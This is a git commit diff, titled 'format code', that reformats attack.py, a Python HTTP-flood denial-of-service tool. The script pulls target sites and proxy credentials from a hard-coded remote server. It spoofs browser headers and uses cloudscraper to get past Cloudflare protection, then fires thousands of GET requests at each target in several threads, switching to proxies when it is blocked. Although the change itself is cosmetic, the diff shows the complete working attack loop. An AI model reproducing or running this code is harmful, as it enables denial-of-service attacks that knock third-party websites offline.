fc6d358346b41fcbf65f79af2545bf2ca8a64b8a
yaroslav <yarik.pro.ph@gmail.com>
2022-02-27 17:53:42 +0200

    format code

--- attack.py
+++ attack.py
@@ -21,26 +21,31 @@ VERSION = 6
 HOSTS = ["http://46.4.63.238/api.php"]
 MAX_REQUESTS = 5000
 disable_warnings()
-def clear():
-  if platform.system() == "Linux":
-    return system('clear')
 
-  return system('cls')
+
+def clear():
+    if platform.system() == "Linux":
+        return system("clear")
+
+    return system("cls")
 
 
 logger.remove()
 logger.add(
-    stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
+    stderr,
+    format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>",
+)
 threads = int(sys.argv[1])
 
 parser = ArgumentParser()
-parser.add_argument("-v", "--verbose", dest="verbose", action='store_true')
-parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
+parser.add_argument("-v", "--verbose", dest="verbose", action="store_true")
+parser.add_argument("-n", "--no-clear", dest="no_clear", action="store_true")
 parser.set_defaults(verbose=False)
 parser.set_defaults(no_clear=False)
 args, unknown = parser.parse_known_args()
 verbose = args.verbose
 no_clear = args.no_clear
+
 
 def checkReq():
     os.system("python3 -m pip install -r requirements.txt")
@@ -52,7 +57,8 @@ def checkReq():
 def checkUpdate():
     print("Checking Updates...")
     updateScraper = cloudscraper.create_scraper(
-        browser={'browser': 'firefox', 'platform': 'android', 'mobile': True},)
+        browser={"browser": "firefox", "platform": "android", "mobile": True},
+    )
     url = "https://gist.githubusercontent.com/AlexTrushkovsky/041d6e2ee27472a69abcb1b2bf90ed4d/raw/nowarversion.json"
     try:
         content = updateScraper.get(url).content
@@ -75,15 +81,37 @@ def checkUpdate():
 
 def mainth():
     scraper = cloudscraper.create_scraper(
-        browser={'browser': 'firefox', 'platform': 'android', 'mobile': True},)
-    scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive',
-                           'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br'})
+        browser={"browser": "firefox", "platform": "android", "mobile": True},
+    )
+    scraper.headers.update(
+        {
+            "Content-Type": "application/json",
+            "cf-visitor": "https",
+            "User-Agent": random_useragent(),
+            "Connection": "keep-alive",
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Language": "ru",
+            "x-forwarded-proto": "https",
+            "Accept-Encoding": "gzip, deflate, br",
+        }
+    )
 
     while True:
         scraper = cloudscraper.create_scraper(
-            browser={'browser': 'firefox', 'platform': 'android', 'mobile': True},)
-        scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive',
-                               'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br'})
+            browser={"browser": "firefox", "platform": "android", "mobile": True},
+        )
+        scraper.headers.update(
+            {
+                "Content-Type": "application/json",
+                "cf-visitor": "https",
+                "User-Agent": random_useragent(),
+                "Connection": "keep-alive",
+                "Accept": "application/json, text/plain, */*",
+                "Accept-Language": "ru",
+                "x-forwarded-proto": "https",
+                "Accept-Encoding": "gzip, deflate, br",
+            }
+        )
         logger.info("GET RESOURCES FOR ATTACK")
         host = choice(HOSTS)
         content = scraper.get(host).content
@@ -91,54 +119,61 @@ def mainth():
             try:
                 data = json.loads(content)
             except json.decoder.JSONDecodeError:
-                logger.info('Host {} has invalid format'.format(host))
+                logger.info("Host {} has invalid format".format(host))
                 sleep(5)
                 continue
             except Exception:
-                logger.exception('Unexpected error. Host {}'.format(host))
+                logger.exception("Unexpected error. Host {}".format(host))
                 sleep(5)
                 continue
         else:
             sleep(5)
             continue
-        logger.info("STARTING ATTACK TO " + data['site']['page'])
-        site = unquote(data['site']['page'])
-        if site.startswith('http') == False:
+        logger.info("STARTING ATTACK TO " + data["site"]["page"])
+        site = unquote(data["site"]["page"])
+        if site.startswith("http") == False:
             site = "https://" + site
 
         attacks_number = 0
 
         try:
             if not verbose:
-              print('Atacking', end ='')
+                print("Atacking", end="")
 
             attack = scraper.get(site)
 
             if attack.status_code >= 302:
-                for proxy in data['proxy']:
+                for proxy in data["proxy"]:
                     scraper.proxies.update(
-                        {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
+                        {
+                            "http": f'{proxy["ip"]}://{proxy["auth"]}',
+                            "https": f'{proxy["ip"]}://{proxy["auth"]}',
+                        }
+                    )
                     response = scraper.get(site)
                     if response.status_code >= 200 and response.status_code <= 302:
                         for i in range(MAX_REQUESTS):
                             response = scraper.get(site)
                             attacks_number += 1
                             if verbose:
-                              logger.info("ATTACKED; RESPONSE CODE: " +
-                                          str(response.status_code))
+                                logger.info(
+                                    "ATTACKED; RESPONSE CODE: "
+                                    + str(response.status_code)
+                                )
                             else:
-                              print('.', end ='')
+                                print(".", end="")
             else:
                 for i in range(MAX_REQUESTS):
                     response = scraper.get(site)
                     attacks_number += 1
                     if verbose:
-                      logger.info("ATTACKED; RESPONSE CODE: " +
-                                  str(response.status_code))
+                        logger.info(
+                            "ATTACKED; RESPONSE CODE: " + str(response.status_code)
+                        )
                     else:
-                      print('.', end ='')
+                        print(".", end="")
             if attacks_number > 0:
-              logger.info("SUCCESSFUL ATTACKS: " + str(attacks_number))
+                logger.info("SUCCESSFUL ATTACKS: " + str(attacks_number))
         except:
             logger.warning("issue happened, SUCCESSFUL ATTACKS: " + str(attacks_number))
             continue
@@ -150,13 +185,13 @@ def cleaner():
         checkUpdate()
 
         if not no_clear:
-          clear()
+            clear()
         collect()
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     if not no_clear:
-      clear()
+        clear()
     checkReq()
     checkUpdate()
     for _ in range(threads):
